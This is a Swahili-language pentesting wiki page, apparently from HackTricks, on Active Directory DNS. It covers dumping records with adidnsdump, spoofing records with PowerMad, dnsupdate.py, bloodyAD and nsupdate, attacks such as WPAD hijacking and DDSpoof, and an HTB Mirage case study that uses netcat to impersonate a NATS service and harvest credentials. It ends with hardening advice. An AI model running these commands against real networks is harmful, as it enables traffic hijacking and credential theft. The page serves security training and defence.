# Rekodi za AD DNS

{{#include ../../banners/hacktricks-training.md}}

Kwa chaguomsingi, **mtumiaji yeyote** katika Active Directory anaweza **kuorodhesha rekodi zote za DNS** katika maeneo ya DNS ya Domain au Forest, sawa na uhamishaji wa eneo (watumiaji wanaweza kuorodhesha vitu vidogo vya eneo la DNS katika mazingira ya AD).

Zana ya [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) huwezesha **kuorodhesha** na **kusafirisha** **rekodi zote za DNS** katika eneo kwa madhumuni ya recon ya mitandao ya ndani.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```

>  adidnsdump v1.4.0 (Aprili 2025) inaongeza matokeo ya JSON/Greppable (`--json`), utatuzi wa DNS wenye nyuzi nyingi na usaidizi wa TLS 1.2/1.3 wakati wa kuunganisha kwenye LDAPS  

Kwa maelezo zaidi, soma [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Kuunda / Kurekebisha rekodi (ADIDNS spoofing)

Kwa kuwa kundi la **Authenticated Users** lina ruhusa ya **Create Child** kwenye zone DACL kwa chaguomsingi, akaunti yoyote ya domain (au akaunti ya kompyuta) inaweza kusajili rekodi za ziada. Hili linaweza kutumiwa kuteka nyara trafiki, kulazimisha NTLM relay au hata kuhatarisha domain nzima.

### PowerMad / Invoke-DNSUpdate (PowerShell)

```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```

### Impacket – dnsupdate.py  (Python)

```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```

*(dnsupdate.py huja pamoja na Impacket ≥0.12.0)*

### BloodyAD

```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```

---

## Vipengele vya kawaida vya mashambulizi

1. **Wildcard record** – `*.<zone>` hugeuza seva ya AD DNS kuwa kijibu-maombi cha kampuni nzima, sawa na spoofing ya LLMNR/NBNS. Inaweza kutumiwa kunasa NTLM hashes au kuzirelay kwa LDAP/SMB.  (Inahitaji WINS-lookup izimwe.)<sup>[[1]](#references)</sup>    
2. **WPAD hijack** – ongeza `wpad` (au rekodi ya **NS** inayoelekeza kwenye host ya mshambuliaji ili kukwepa Global-Query-Block-List) na u-proxy kwa uwazi maombi ya HTTP yanayotoka ili kukusanya credentials. Microsoft ilifanyia marekebisho njia za kukwepa wildcard/DNAME (CVE-2018-8320), lakini **NS-records bado zinafanya kazi**.<sup>[[1]](#references)</sup>    
3. **Utekaji wa ingizo lililopitwa na wakati** – dai anwani ya IP iliyokuwa ya workstation hapo awali; ingizo la DNS linalohusishwa nalo bado litatatua jina, na kuwezesha mashambulizi ya resource-based constrained delegation au Shadow-Credentials bila kugusa DNS kabisa.    
4. **DHCP → DNS spoofing** – katika usanidi chaguomsingi wa Windows DHCP+DNS, mshambuliaji asiye na uthibitishaji kwenye subnet hiyo hiyo anaweza kubadilisha A record yoyote iliyopo (ikiwemo za Domain Controllers) kwa kutuma maombi ya DHCP yaliyoghushiwa ambayo huanzisha dynamic DNS updates (Akamai “DDSpoof”, 2023). Hii huwezesha machine-in-the-middle dhidi ya Kerberos/LDAP na inaweza kusababisha kutekwa kikamilifu kwa domain.<sup>[[2]](#references)</sup>    
5. **Certifried (CVE-2022-26923)** – badilisha `dNSHostName` ya akaunti ya mashine unayoidhibiti, sajili A record inayolingana, kisha omba certificate ya jina hilo ili kujifanya DC. Zana kama **Certipy** au **BloodyAD** huendesha mchakato mzima kiotomatiki.  

An AD DNS record with [serialized target information](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073) inaweza kuwa sehemu ya mnyororo wa conditional relay: mpigaji anahitaji ruhusa ya kuunda rekodi, njia ya coercion inayosababisha kompyuta lengwa kujithibitisha kwa jina hilo, na lengwa la relay linalokubali uthibitishaji huo. Tathmini itifaki ya lengwa kivyake; SMB signing kwenye muunganisho unaoingia haiwezi yenyewe kubainisha kama lengwa la HTTPS WinRM linakubali relay. Kiwango cha viraka, ushughulikiaji wa majina, Extended Protection na usanidi wa huduma vinaweza kubadilisha matokeo.

---

### Utekaji wa huduma ya ndani kupitia rekodi zinazobadilika zilizopitwa na wakati (uchunguzi wa kesi ya NATS)

Wakati dynamic updates zinaruhusiwa kwa watumiaji wote walioidhinishwa, **jina la huduma lililoondolewa kwenye usajili linaweza kudaiwa tena na kuelekezwa kwenye miundombinu ya mshambuliaji**. DC ya Mirage HTB ilifichua hostname `nats-svc.mirage.htb` baada ya DNS scavenging, hivyo mtumiaji yeyote mwenye ruhusa ndogo angeweza:<sup>[[3]](#references)</sup>

1. **Thibitisha kuwa rekodi haipo** na ujifunze SOA kwa kutumia `dig`:

```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```

2. **Unda upya rekodi** ukielekeza kwenye kiolesura cha nje/VPN wanachodhibiti:

```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```

3. **Jifanye kuwa huduma ya plaintext**. Wateja wa NATS wanatarajia kuona bango moja la `INFO { ... }` kabla ya kutuma vitambulisho vyao, kwa hiyo kunakili bango halali kutoka kwa broker halisi kunatosha kukusanya siri:

```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```

Mteja yeyote anayetatua jina lililotekwa atavuja mara moja fremu yake ya JSON `CONNECT` (ikiwemo `"user"`/`"pass"`) kwa listener. Kuendesha binary rasmi ya `nats-server -V` kwenye host ya mshambuliaji, kuzima uondoaji wa taarifa nyeti kwenye logi zake, au kunasa tu session kwa Wireshark hutoa credentials zilezile za maandishi wazi kwa sababu TLS ilikuwa ya hiari.

4. **Pivot kwa kutumia creds zilizokamatwa** – katika Mirage, akaunti ya NATS iliyoibwa ilitoa ufikiaji wa JetStream, uliofichua matukio ya kihistoria ya uthibitishaji yenye majina ya watumiaji/nywila za AD zinazoweza kutumiwa tena.

Mfumo huu unatumika kwa kila huduma iliyounganishwa na AD inayotegemea handshakes za TCP zisizolindwa (HTTP APIs, RPC, MQTT, n.k.): rekodi ya DNS inapotekwa, mshambuliaji anakuwa huduma yenyewe.
Kwa enumeration ya upande wa broker na workflow ya retained-message, angalia [NATS / JetStream pentesting](../../network-services-pentesting/4222-pentesting-nats.md).

---

## Ugunduzi na uimarishaji

* Zuia **Authenticated Users** kupata haki ya *Create all child objects* kwenye maeneo nyeti, na ukabidhi dynamic updates kwa akaunti maalum inayotumiwa na DHCP.
* Ikiwa dynamic updates zinahitajika, weka eneo kuwa **Secure-only** na uwashe **Name Protection** katika DHCP ili tu computer object mmiliki iweze kubadilisha rekodi yake.
* Fuatilia DNS Server event IDs 257/252 (dynamic update), 770 (zone transfer) na LDAP writes kwa `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Zuia majina hatari (`wpad`, `isatap`, `*`) kwa kutumia rekodi isiyo na madhara kimakusudi au Global Query Block List.
* Sasisha DNS servers – kwa mfano, hitilafu za RCE CVE-2024-26224 na CVE-2024-26231 zilipata **CVSS 9.8** na zinaweza kutumiwa kwa mbali dhidi ya Domain Controllers.  



## References

- [1] [ADIDNS Yachunguzwa Tena - WPAD, GQBL, na Mengineyo](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
- [2] [Kughushi Rekodi za DNS kwa Kutumia Vibaya DHCP DNS Dynamic Updates](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Kuingia kwenye Zone: Kutupa Active Directory DNS kwa kutumia adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
{{#include ../../banners/hacktricks-training.md}}
